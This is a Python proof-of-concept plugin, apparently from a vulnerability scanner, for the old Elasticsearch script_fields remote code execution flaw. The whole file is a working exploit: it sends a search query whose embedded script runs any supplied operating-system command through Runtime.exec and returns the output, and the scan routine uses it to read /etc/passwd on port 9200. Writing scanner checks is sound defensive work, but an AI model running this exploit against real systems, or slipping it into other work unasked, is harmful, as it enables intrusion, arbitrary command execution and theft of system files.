#!/usr/bin/env python
# -*- coding: utf-8 -*-

from lib.poc.dummy import *
import json


async def execute(ip, port, url, command):
    parameters = {"size": 1, "query": {"filtered": {"query": {"match_all": {}}}},
                  "script_fields": {
                      "command": {
                          "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime()."
                                    "exec(\"{}\").getInputStream()).useDelimiter(\"\\\\A\").next();".format(command)
                      }
                  }
                  }
    try:

        r = await http_client(ip, port).post(url, json=parameters, timeout=20)
        if r.status_code != 200:
            return
        body = json.loads(r.text)
        result = body["hits"]["hits"][0]["fields"]["command"][0]
        return url, result
    except Exception as e:
        logger(e)


@http_scan
async def do_scan(ip, port, service, is_http, task_msg):
    if service.lower() != 'wap-wsp' and port not in [9200]:
        return
    try:
        url = "%s://%s:%s/_search?pretty" % (service, ip, port)
        res = await execute(ip, port, url, 'cat /etc/passwd')
        if res and res[1].find('root:x:0:0') >= 0:
            ret = {
                'alert_group': 'ES Groovy Remote Code Execution',
                'affects': '%s://%s:%s' % (service, ip, port),
                'details': 'ES的低版本可执行Groovy脚本并调用命令命令，通过该漏洞可导致机器被入侵\n'
                           'cmd: cat /etc/passwd\n%s\n\n output:\n\n%s' % (res[0], res[1])
            }
            return ret
    except Exception as e:
        debug(e)


if __name__ == '__main__':
    scan = do_scan('easypen-test.lijiejie.com', 9200, 'http', True, task_msg={})
    run_plugin_test(scan)
